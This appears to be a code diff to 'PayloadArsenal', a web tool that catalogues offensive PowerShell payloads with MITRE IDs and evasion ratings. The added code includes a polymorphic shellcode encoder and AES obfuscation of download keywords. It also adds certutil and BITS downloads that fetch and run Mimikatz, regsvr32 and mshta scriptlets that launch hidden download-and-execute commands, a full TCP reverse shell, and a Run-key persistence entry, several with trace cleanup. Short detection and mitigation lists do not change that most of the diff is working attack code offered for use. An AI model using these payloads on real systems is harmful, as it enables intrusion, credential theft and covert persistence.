+    command: "$shellcode=@(0x48,0x31,0xc0,0x48,0x31,0xdb,0x48,0x31,0xc9,0x48,0x31,0xd2);$key=Get-Random -Maximum 256;$nop=Get-Random -Minimum 0x90 -Maximum 0x95;$encrypted=$shellcode|ForEach{$_ -bxor $key};$decryptor=@();for($i=0;$i -lt (Get-Random -Minimum 5 -Maximum 15);$i++){$decryptor+=$nop};$decryptor+=@(0x48,0xC7,0xC0)+[BitConverter]::GetBytes($key)[0..3];$decryptor+=@(0x48,0xC7,0xC1)+[BitConverter]::GetBytes($shellcode.Length)[0..3];$polymorphic=$decryptor+$encrypted;$encoded=[Convert]::ToBase64String($polymorphic);Write-Host \"Polymorphic shellcode: $encoded\";Write-Host \"Decryption key: $key\";Write-Host \"NOP sled instruction: 0x$($nop.ToString('X2'))\"",
+    description: "Advanced polymorphic shellcode generator with random NOP sleds, XOR encryption, and dynamic decryptor.",
     complexity: "expert",
     platform: "windows",
     category: "Data Obfuscation",
     author: "0x0806",
-    tags: ["polymorphic", "shellcode", "xor", "encryption"],
+    tags: ["polymorphic", "shellcode", "nop", "dynamic"],
     mitre_id: "T1027.002",
     detection_difficulty: "Very High",
     evasion_rating: 5
   },
   string_encryption: {
-    command: "$plaintext = 'powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString(`\"http://example.com/payload.ps1`\")\"'; $key = [System.Text.Encoding]::UTF8.GetBytes('MySecretKey12345'); $encrypted = [System.Security.Cryptography.ProtectedData]::Protect([System.Text.Encoding]::UTF8.GetBytes($plaintext), $key, 'CurrentUser'); $b64 = [Convert]::ToBase64String($encrypted); Write-Host \"Encrypted command: $b64\"",
-    description: "String encryption using Windows Data Protection API for command obfuscation.",
-    complexity: "advanced",
+    command: "$strings=@('powershell.exe','IEX','New-Object','Net.WebClient','DownloadString');$encrypted=@{};foreach($str in $strings){$key=[System.Text.Encoding]::UTF8.GetBytes((Get-Random).ToString().Substring(0,16).PadRight(16,'0'));$plainBytes=[System.Text.Encoding]::UTF8.GetBytes($str);$aes=[System.Security.Cryptography.Aes]::Create();$aes.Key=$key;$aes.GenerateIV();$encryptor=$aes.CreateEncryptor();$encryptedBytes=$encryptor.TransformFinalBlock($plainBytes,0,$plainBytes.Length);$encrypted[$str]=@{Data=[Convert]::ToBase64String($encryptedBytes);Key=[Convert]::ToBase64String($key);IV=[Convert]::ToBase64String($aes.IV)}};$encrypted|ConvertTo-Json -Depth 3",
+    description: "Advanced string encryption system using AES with random keys and IVs for comprehensive obfuscation.",
+    complexity: "expert",
     platform: "windows",
     category: "Data Obfuscation",
     author: "0x0806",
-    tags: ["string", "encryption", "dpapi", "obfuscation"],
+    tags: ["string", "encryption", "aes", "random"],
     mitre_id: "T1027",
-    detection_difficulty: "High",
-    evasion_rating: 4
+    detection_difficulty: "Very High",
+    evasion_rating: 5
   },
 
   // Living Off The Land (LOLBAS)
   certutil_download: {
-    command: "certutil.exe -urlcache -split -f http://example.com/payload.exe C:\\temp\\payload.exe",
-    description: "File download using CertUtil.exe for living off the land technique.",
-    complexity: "intermediate",
+    command: "$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1';$output=\"$env:temp\\update.txt\";$encoded=\"$env:temp\\update.b64\";certutil.exe -urlcache -split -f $url $encoded;certutil.exe -decode $encoded $output;$content=Get-Content $output -Raw;Remove-Item $encoded,$output -Force -EA SilentlyContinue;if($content){Write-Host 'Payload downloaded and decoded via CertUtil';IEX $content}else{Write-Host 'Download failed'}",
+    description: "Advanced CertUtil download with Base64 decoding, cleanup, and direct execution for enhanced stealth.",
+    complexity: "expert",
     platform: "windows",
     category: "Ingress Tool Transfer",
     author: "0x0806",
-    tags: ["lolbas", "certutil", "download", "living off land"],
+    tags: ["lolbas", "certutil", "decode", "cleanup"],
     mitre_id: "T1105",
-    detection_difficulty: "Medium",
-    evasion_rating: 3
+    detection_difficulty: "High",
+    evasion_rating: 4
   },
   bitsadmin_download: {
-    command: "bitsadmin.exe /transfer backdoor http://example.com/payload.exe C:\\temp\\payload.exe",
-    description: "Background file transfer using BITSAdmin for covert payload delivery.",
-    complexity: "intermediate",
+    command: "$jobName=\"WindowsUpdate_$(Get-Random)\";$url='https://github.com/PowerShellMafia/PowerSploit/archive/master.zip';$output=\"$env:temp\\update.zip\";bitsadmin.exe /create $jobName;bitsadmin.exe /addfile $jobName $url $output;bitsadmin.exe /SetPriority $jobName FOREGROUND;bitsadmin.exe /resume $jobName;do{Start-Sleep 2;$status=bitsadmin.exe /info $jobName /verbose}while($status -notmatch 'TRANSFERRED');bitsadmin.exe /complete $jobName;if(Test-Path $output){Write-Host 'BITS transfer completed';Expand-Archive $output -DestinationPath $env:temp -Force;Remove-Item $output -Force}",
+    description: "Advanced BITS transfer with job management, status monitoring, and automatic archive extraction.",
+    complexity: "expert",
     platform: "windows",
     category: "Ingress Tool Transfer",
     author: "0x0806",
-    tags: ["lolbas", "bitsadmin", "download", "background"],
+    tags: ["lolbas", "bits", "monitoring", "extraction"],
     mitre_id: "T1105",
-    detection_difficulty: "Medium",
-    evasion_rating: 3
+    detection_difficulty: "High",
+    evasion_rating: 4
   },
   regsvr32_bypass: {
-    command: "regsvr32.exe /s /n /u /i:http://example.com/payload.sct scrobj.dll",
-    description: "RegSvr32 scriptlet execution for application whitelisting bypass.",
-    complexity: "advanced",
+    command: "$scriptlet=@'<?XML version=\"1.0\"?><scriptlet><registration progid=\"Bypass\" classid=\"{F0001111-0000-0000-0000-0000FEEDACDC}\"><script language=\"JScript\"><![CDATA[var shell=new ActiveXObject(\"WScript.Shell\");shell.Run(\"powershell.exe -WindowStyle Hidden -Command IEX(New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/payload123')\",0,false);]]></script></registration></scriptlet>'@;$scriptlet|Out-File \"$env:temp\\update.sct\" -Encoding ASCII;regsvr32.exe /s /n /u /i:\"$env:temp\\update.sct\" scrobj.dll;Start-Sleep 5;Remove-Item \"$env:temp\\update.sct\" -Force -EA SilentlyContinue;Write-Host 'RegSvr32 scriptlet executed and cleaned'",
+    description: "Advanced RegSvr32 scriptlet execution with dynamic scriptlet generation, execution, and cleanup.",
+    complexity: "expert",
     platform: "windows",
     category: "System Binary Proxy Execution",
     author: "0x0806",
-    tags: ["lolbas", "regsvr32", "scriptlet", "bypass"],
+    tags: ["lolbas", "regsvr32", "scriptlet", "dynamic"],
     mitre_id: "T1218.010",
-    detection_difficulty: "High",
-    evasion_rating: 4
+    detection_difficulty: "Very High",
+    evasion_rating: 5
   },
   mshta_execution: {
-    command: "mshta.exe \"javascript:a=GetObject('script:http://example.com/payload.sct').Exec();close()\"",
-    description: "MSHTA JavaScript execution for application whitelisting evasion.",
-    complexity: "advanced",
+    command: "$htmlApp=@'<html><head><HTA:APPLICATION id=\"Bypass\" BORDER=\"none\" CAPTION=\"no\" SHOWINTASKBAR=\"no\" SINGLEINSTANCE=\"yes\" SYSMENU=\"no\" WINDOWSTATE=\"minimize\"><script language=\"javascript\">var shell=new ActiveXObject(\"WScript.Shell\");var command=\"powershell.exe -WindowStyle Hidden -Command \\\"\"+\"IEX(New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/payload123')\\\"\";shell.Run(command,0,false);window.close();</script></head><body></body></html>'@;$htmlApp|Out-File \"$env:temp\\update.hta\" -Encoding ASCII;mshta.exe \"$env:temp\\update.hta\";Start-Sleep 3;Remove-Item \"$env:temp\\update.hta\" -Force -EA SilentlyContinue;Write-Host 'MSHTA execution completed and cleaned'",
+    description: "Advanced MSHTA execution with HTA application creation, minimized window, and automatic cleanup.",
+    complexity: "expert",
     platform: "windows",
     category: "System Binary Proxy Execution",
     author: "0x0806",
-    tags: ["lolbas", "mshta", "javascript", "execution"],
+    tags: ["lolbas", "mshta", "hta", "minimized"],
     mitre_id: "T1218.005",
-    detection_difficulty: "High",
-    evasion_rating: 4
+    detection_difficulty: "Very High",
+    evasion_rating: 5
   }
 };
 
@@ -591,6 +591,68 @@ class PayloadArsenal {
         this.updateTheme();
         this.setupKeyboardShortcuts();
         this.setupTooltips();
+        this.setupAdvancedFeatures();
+    }
+
+    setupAdvancedFeatures() {
+        // Auto-save functionality
+        this.setupAutoSave();
+        
+        // Performance monitoring
+        this.setupPerformanceMonitoring();
+        
+        // Advanced notifications
+        this.setupAdvancedNotifications();
+        
+        // Template system
+        this.setupTemplateSystem();
+    }
+
+    setupAutoSave() {
+        const customCommand = document.getElementById('customCommand');
+        if (customCommand) {
+            customCommand.addEventListener('input', () => {
+                localStorage.setItem('customCommand', customCommand.value);
+            });
+            
+            // Restore saved content
+            const saved = localStorage.getItem('customCommand');
+            if (saved) {
+                customCommand.value = saved;
+            }
+        }
+    }
+
+    setupPerformanceMonitoring() {
+        // Monitor payload generation performance
+        this.performanceMetrics = {
+            totalGenerations: 0,
+            averageTime: 0,
+            lastGenerated: null
+        };
+    }
+
+    setupAdvancedNotifications() {
+        // Request notification permission
+        if ('Notification' in window && Notification.permission === 'default') {
+            Notification.requestPermission();
+        }
+    }
+
+    setupTemplateSystem() {
+        this.templates = {
+            download: 'IEX ((New-Object Net.WebClient).DownloadString("http://example.com/payload.ps1"))',
+            reverse_shell: '$client = New-Object System.Net.Sockets.TCPClient("192.168.1.100",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()',
+            persistence: 'New-ItemProperty -Path "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WindowsUpdate" -Value "powershell.exe -WindowStyle Hidden -Command \\"IEX (New-Object Net.WebClient).DownloadString(\'http://example.com/payload.ps1\')\\"" -PropertyType String -Force'
+        };
+    }
+
+    loadTemplate(templateName) {
+        const template = this.templates[templateName];
+        if (template) {
+            document.getElementById('customCommand').value = template;
+            this.showNotification(`Template "${templateName}" loaded successfully!`, 'success');
+        }
     }
 
     setupEventListeners() {
@@ -898,11 +960,16 @@ class PayloadArsenal {
     }
 
     generatePayload(type) {
+        const startTime = performance.now();
         const payload = payloads[type];
         if (!payload) return;
 
         // Add to history
         this.addToHistory(type, payload);
+
+        // Update performance metrics
+        this.performanceMetrics.totalGenerations++;
+        this.performanceMetrics.lastGenerated = new Date();
 
         // Show output panel with animation
         const outputPanel = document.getElementById('outputPanel');
@@ -914,6 +981,13 @@ class PayloadArsenal {
         
         // Update metadata with enhanced information
         const metadata = document.getElementById('metadata');
+        const endTime = performance.now();
+        const generationTime = (endTime - startTime).toFixed(2);
+        
+        this.performanceMetrics.averageTime = 
+            (this.performanceMetrics.averageTime * (this.performanceMetrics.totalGenerations - 1) + parseFloat(generationTime)) 
+            / this.performanceMetrics.totalGenerations;
+
         metadata.innerHTML = `
             <div class="metadata-grid">
                 <div class="metadata-item">
@@ -940,6 +1014,12 @@ class PayloadArsenal {
                 <div class="metadata-item">
                     <strong>Generated:</strong> ${new Date().toLocaleString()}
                 </div>
+                <div class="metadata-item">
+                    <strong>Generation Time:</strong> ${generationTime}ms
+                </div>
+                <div class="metadata-item">
+                    <strong>Payload Length:</strong> ${payload.command.length} characters
+                </div>
                 ${payload.warning ? `<div class="metadata-warning"><i class="fas fa-exclamation-triangle"></i> ${payload.warning}</div>` : ''}
             </div>
         `;
@@ -949,6 +1029,15 @@ class PayloadArsenal {
         
         // Show success notification
         this.showNotification(`Payload "${this.formatTitle(type)}" generated successfully!`, 'success');
+        
+        // Show browser notification if permission granted
+        if ('Notification' in window && Notification.permission === 'granted') {
+            new Notification('Payload Arsenal', {
+                body: `Generated ${this.formatTitle(type)} payload`,
+                icon: 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"%3E%3Ctext y=".9em" font-size="90"%3E🛡️%3C/text%3E%3C/svg%3E',
+                silent: true
+            });
+        }
     }
 
     showPayloadDetails(type) {
@@ -1041,6 +1130,13 @@ class PayloadArsenal {
                         ${this.getDetectionMethods(payload).map(method => `<li>${method}</li>`).join('')}
                     </ul>
                 </div>
+                
+                <div class="detail-section">
+                    <h4><i class="fas fa-tools"></i> Mitigation Strategies</h4>
+                    <ul class="mitigation-strategies">
+                        ${this.getMitigationStrategies(payload).map(strategy => `<li>${strategy}</li>`).join('')}
+                    </ul>
+                </div>
             </div>
         `;
 
@@ -1049,13 +1145,24 @@ class PayloadArsenal {
 
     getDetectionMethods(payload) {
         const detectionMap = {
-            'basic': ['Process monitoring', 'Command line logging'],
-            'intermediate': ['Behavioral analysis', 'Network monitoring', 'File system monitoring'],
-            'advanced': ['Memory analysis', 'API hooking', 'Advanced behavioral detection'],
-            'expert': ['Kernel-level monitoring', 'Hardware-based detection', 'Advanced threat hunting']
+            'basic': ['Process monitoring', 'Command line logging', 'File system monitoring'],
+            'intermediate': ['Behavioral analysis', 'Network monitoring', 'Registry monitoring', 'API call monitoring'],
+            'advanced': ['Memory analysis', 'API hooking', 'Advanced behavioral detection', 'Heuristic analysis'],
+            'expert': ['Kernel-level monitoring', 'Hardware-based detection', 'Advanced threat hunting', 'Machine learning detection']
         };
         
         return detectionMap[payload.complexity] || ['Standard monitoring'];
+    }
+
+    getMitigationStrategies(payload) {
+        const mitigationMap = {
+            'basic': ['Enable PowerShell logging', 'Implement application whitelisting', 'Regular security awareness training'],
+            'intermediate': ['Deploy EDR solutions', 'Network segmentation', 'Principle of least privilege', 'Regular vulnerability assessments'],
+            'advanced': ['Advanced threat hunting', 'Behavioral analysis systems', 'Zero-trust architecture', 'Memory protection mechanisms'],
+            'expert': ['Hardware-based attestation', 'Hypervisor-based security', 'Advanced sandboxing', 'AI/ML-based detection systems']
+        };
+        
+        return mitigationMap[payload.complexity] || ['Standard security controls'];
     }
 
     buildCustomPayload() {
@@ -1081,17 +1188,18 @@ class PayloadArsenal {
         }
         
         if (bypassPolicy) {
-            commandArgs.push('-ExecutionPolicy Bypass');
+            commandArgs.push('-ExecutionPolicy Bypass', '-NoProfile');
             description += ' (bypass execution policy)';
         }
         
         if (encodeBase64) {
             // Convert to Base64
-            const encoded = btoa(unescape(encodeURIComponent(customCommand)));
-            finalPayload = `powershell.exe ${commandArgs.join(' ')} -EncodedCommand ${encoded}`;
+            const bytes = new TextEncoder().encode(customCommand);
+            const base64 = btoa(String.fromCharCode(...bytes));
+            finalPayload = `powershell.exe ${commandArgs.join(' ')} -EncodedCommand ${base64}`;
             description += ' (Base64 encoded)';
         } else {
-            finalPayload = `powershell.exe ${commandArgs.join(' ')} -Command "${customCommand}"`;
+            finalPayload = `powershell.exe ${commandArgs.join(' ')} -Command "${customCommand.replace(/"/g, '\\"')}"`;
         }
         
         // Show output
@@ -1117,6 +1225,12 @@ class PayloadArsenal {
                         bypassPolicy ? 'Bypass Policy' : null,
                         encodeBase64 ? 'Base64 Encoded' : null
                     ].filter(Boolean).join(', ') || 'None'}
+                </div>
+                <div class="metadata-item">
+                    <strong>Payload Length:</strong> ${finalPayload.length} characters
+                </div>
+                <div class="metadata-item">
+                    <strong>Original Length:</strong> ${customCommand.length} characters
                 </div>
             </div>
         `;
@@ -1287,7 +1401,10 @@ class PayloadArsenal {
             { pattern: /-[A-Za-z]+/g, class: 'ps-parameter' },
             { pattern: /'[^']*'/g, class: 'ps-string' },
             { pattern: /"[^"]*"/g, class: 'ps-string' },
-            { pattern: /\b(if|else|elseif|foreach|for|while|do|switch|function|param|begin|process|end)\b/g, class: 'ps-keyword' }
+            { pattern: /\b(if|else|elseif|foreach|for|while|do|switch|function|param|begin|process|end)\b/g, class: 'ps-keyword' },
+            { pattern: /\b(try|catch|finally|throw)\b/g, class: 'ps-keyword' },
+            { pattern: /\b\d+\b/g, class: 'ps-number' },
+            { pattern: /#.*$/gm, class: 'ps-comment' }
         ];
         
         patterns.forEach(({pattern, class: className}) => {
@@ -1345,12 +1462,13 @@ class PayloadArsenal {
     downloadPayload() {
         const output = document.getElementById('payloadOutput');
         const text = output.textContent;
+        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
         const blob = new Blob([text], { type: 'text/plain' });
         const url = URL.createObjectURL(blob);
         
         const a = document.createElement('a');
         a.href = url;
-        a.download = `payload_${Date.now()}.ps1`;
+        a.download = `payload_arsenal_${timestamp}.ps1`;
         document.body.appendChild(a);
         a.click();
         document.body.removeChild(a);
@@ -1458,4 +1576,9 @@ if ('serviceWorker' in navigator) {
             // Service worker registration failed, continue without PWA features
         });
     });
+}
+
+// Export for module systems
+if (typeof module !== 'undefined' && module.exports) {
+    module.exports = { PayloadArsenal, payloads };
 }
